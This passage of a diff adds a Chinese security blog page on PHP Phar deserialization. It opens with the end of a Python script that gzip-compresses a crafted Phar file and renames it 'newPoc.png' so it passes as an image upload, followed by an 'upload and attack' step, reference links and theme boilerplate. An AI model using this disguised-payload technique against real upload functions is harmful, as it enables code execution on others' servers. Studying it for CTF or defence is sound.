GBMB)</span><br><span class="hljs-comment">#print(newf)</span><br>newf = gzip.<span class="hljs-title function_ invoke__">compress</span>(newf) <span class="hljs-comment">#对Phar文件进行gzip压缩</span><br>with <span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;newPoc.png&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<span class="hljs-comment">#更改文件后缀</span><br>    file.<span class="hljs-title function_ invoke__">write</span>(newf)<br></code></pre></td></tr></table></figure>
+
+<p>构造完毕之后，上传并攻击</p>
+<p><a target="_blank" rel="noopener" href="http://qetx.top/posts/42785/1699355091265-70f0772d-e618-4b4d-8972-2f2aeb2c7815.png"><img src="/2023/11/23/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1699355091265-70f0772d-e618-4b4d-8972-2f2aeb2c7815.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/">https://mochazz.github.io/2019/02/02/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bphar/</a></p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7152298620656549896#heading-1">https://juejin.cn/post/7152298620656549896#heading-1</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2278965">https://cloud.tencent.com/developer/article/2278965</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/" class="print-no-link">#Web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Phar 反序列化</div>
+      <div>http://example.com/2023/11/23/Phar反序列化/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Whhxy4</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/11/27/%E6%97%A0%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="无参数命令执行">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">无参数命令执行</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/20/HECTF2023/" title="HECTF2023">
+                        <span class="hidden-mobile">HECTF2023</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
